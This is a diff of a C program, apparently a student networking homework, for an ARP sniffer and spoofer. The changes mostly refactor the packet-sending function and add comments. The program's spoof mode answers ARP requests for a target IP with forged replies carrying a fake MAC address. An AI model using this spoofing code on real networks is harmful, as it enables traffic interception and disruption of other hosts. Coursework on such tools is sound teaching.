@@ -7,6 +7,7 @@
 #include <net/if.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <unistd.h> 
 
 #include "arp.h"
 
@@ -20,8 +21,9 @@
  * If you don't know your device name, you can use "ifconfig" command on Linux.
  * You have to use "enp2s0f5" when you ready to upload your homework.
  */
-#define DEVICE_NAME "enp2s0f5"
+// #define DEVICE_NAME "enp2s0f5"
 // #define DEVICE_NAME "h1-eth0"
+#define DEVICE_NAME "eno1"
 
 #define RED "\x1B[31m"
 #define GRN "\x1B[32m"
@@ -127,9 +129,11 @@ void sniff(int sockfd, int mode, char *str_target_ip)
 	{
 		recvfrom(sockfd, &packet, sizeof(struct arp_packet), 0, 0, 0);
 
+		// hardware type
 		if (packet.eth_hdr.ether_type != htons(ETHERTYPE_ARP))
 			continue;
 
+		// protocol type
 		if (packet.arp.arp_pro != htons(ETHERTYPE_IP))
 			continue;
 
@@ -138,12 +142,14 @@ void sniff(int sockfd, int mode, char *str_target_ip)
 		case LIST_TARGET:
 			if (ntohs(packet.arp.arp_op) != ARPOP_REQUEST)
 				continue;
+			// check is target?
 			if (*(unsigned int *)packet.arp.arp_tpa != target_ip.s_addr)
 				continue;
 			break;
 		case QUERY:
 			if (ntohs(packet.arp.arp_op) != ARPOP_REPLY)
 				continue;
+			// check is target?
 			if (*(unsigned int *)packet.arp.arp_spa != target_ip.s_addr)
 				continue;
 			break;
@@ -155,46 +161,42 @@ void sniff(int sockfd, int mode, char *str_target_ip)
 	}
 }
 
-void send_packet(int mode, int sockfd, int sll_ifindex, u_char *source_mac, u_char *target_mac, char *str_source_ip, char *str_target_ip)
+void send_arp(int sockfd, int mode, struct sockaddr_ll *sa, u_char *source_mac, u_char *target_mac, char *str_source_ip, char *str_target_ip)
 {
-	struct sockaddr_ll sa;
-	struct arp_packet packet_send;
+	struct arp_packet arp_send;
 	struct sockaddr_in dst;
 	dst.sin_family = AF_INET;
 
-	bzero(&sa, sizeof(sa));
+	// ethernet packet
+	// set mac address
+	memcpy(arp_send.eth_hdr.ether_shost, source_mac, 6);
+	memcpy(arp_send.eth_hdr.ether_dhost, target_mac, 6);
+	// ether type
+	arp_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
 
-	// set ethernet packet
-	packet_send.eth_hdr.ether_type = htons(ETHERTYPE_ARP);
-	// mac address
-	memcpy(packet_send.eth_hdr.ether_shost, source_mac, 6);
-	memcpy(packet_send.eth_hdr.ether_dhost, target_mac, 6);
-
-	// set arp packet
-	packet_send.arp.arp_hrd = htons(ARPHRD_ETHER);
-	packet_send.arp.arp_pro = htons(ETHERTYPE_IP);
-	packet_send.arp.arp_hln = ETHER_ADDR_LEN;
-	packet_send.arp.arp_pln = 4;
+	// arp packet
+	// set hardware type
+	arp_send.arp.arp_hrd = htons(ARPHRD_ETHER);
+	// set protocol type
+	arp_send.arp.arp_pro = htons(ETHERTYPE_IP);
+	// set address len
+	arp_send.arp.arp_hln = 6;
+	arp_send.arp.arp_pln = 4;
+	// set arp operation
 	if (mode == QUERY)
-		packet_send.arp.arp_op = htons(ARPOP_REQUEST);
+		arp_send.arp.arp_op = htons(ARPOP_REQUEST);
 	else
-		packet_send.arp.arp_op = htons(ARPOP_REPLY);
-	memcpy(packet_send.arp.arp_sha, source_mac, 6);
-	memcpy(packet_send.arp.arp_tha, target_mac, 6);
-
+		arp_send.arp.arp_op = htons(ARPOP_REPLY);
+	// set mac
+	memcpy(arp_send.arp.arp_sha, source_mac, 6);
+	memcpy(arp_send.arp.arp_tha, target_mac, 6);
+	// set ip
 	inet_pton(AF_INET, str_source_ip, &dst.sin_addr);
-	memcpy(packet_send.arp.arp_spa, &dst.sin_addr.s_addr, 4);
+	memcpy(arp_send.arp.arp_spa, &dst.sin_addr.s_addr, 4);
 	inet_pton(AF_INET, str_target_ip, &dst.sin_addr);
-	memcpy(packet_send.arp.arp_tpa, &dst.sin_addr.s_addr, 4);
+	memcpy(arp_send.arp.arp_tpa, &dst.sin_addr.s_addr, 4);
 
-	sa.sll_family = AF_PACKET;
-	sa.sll_halen = htons(ETHER_ADDR_LEN);
-	sa.sll_ifindex = sll_ifindex;
-
-	if (sendto(sockfd, &packet_send, sizeof(packet_send), 0, (struct sockaddr *)&sa, sizeof(sa)) == -1)
-	{
-		perror("sendto error.");
-	}
+	sendto(sockfd, &arp_send, sizeof(arp_send), 0, (struct sockaddr *)&*sa, sizeof(*sa));
 }
 
 /*
@@ -236,10 +238,13 @@ int main(int argc, unsigned char *argv[])
 
 	strcpy(req.ifr_ifrn.ifrn_name, DEVICE_NAME);
 
-	// get interface number
+	// get interface number & set sa
 	if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1)
 		perror("ioctl error."), exit(1);
+	bzero(&sa, sizeof(sa));
 	sll_ifindex = req.ifr_ifru.ifru_ivalue;
+	sa.sll_family = AF_PACKET;
+	sa.sll_ifindex = sll_ifindex;
 
 	printf("[ARP sniffer and spoof program ]\n");
 
@@ -280,10 +285,10 @@ int main(int argc, unsigned char *argv[])
 
 		get_my_mac(&my_mac);
 		get_my_ip(&my_ip);
-		send_packet(
-			QUERY,
+		send_arp(
 			sockfd_send,
-			sll_ifindex,
+			QUERY,
+			&sa,
 			my_mac,
 			braodcast_mac,
 			my_ip,
@@ -291,8 +296,8 @@ int main(int argc, unsigned char *argv[])
 
 		sniff(sockfd_recv, QUERY, argv[2]);
 
-		printf("MAC Address of %u.%u.%u.%u is %x:%x:%x:%x:%x:%x\n",
-			   packet.arp.arp_spa[0], packet.arp.arp_spa[1], packet.arp.arp_spa[2], packet.arp.arp_spa[3],
+		printf("MAC Address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n",
+			   argv[2],
 			   packet.arp.arp_sha[0], packet.arp.arp_sha[1], packet.arp.arp_sha[2],
 			   packet.arp.arp_sha[3], packet.arp.arp_sha[4], packet.arp.arp_sha[5]);
 	}
@@ -315,14 +320,17 @@ int main(int argc, unsigned char *argv[])
 				packet.arp.arp_spa[2],
 				packet.arp.arp_spa[3]);
 
-		send_packet(
-			SPOOF,
+		send_arp(
 			sockfd_send,
-			sll_ifindex, 
+			SPOOF,
+			&sa, 
 			fake_mac,
 			packet.arp.arp_sha,
 			argv[2],
 			target);
+
+		printf("Sent ARP Reply : %s is  %s ", argv[2], argv[1]);
+        printf("Send successful.\n");
 	}
 
 	/*
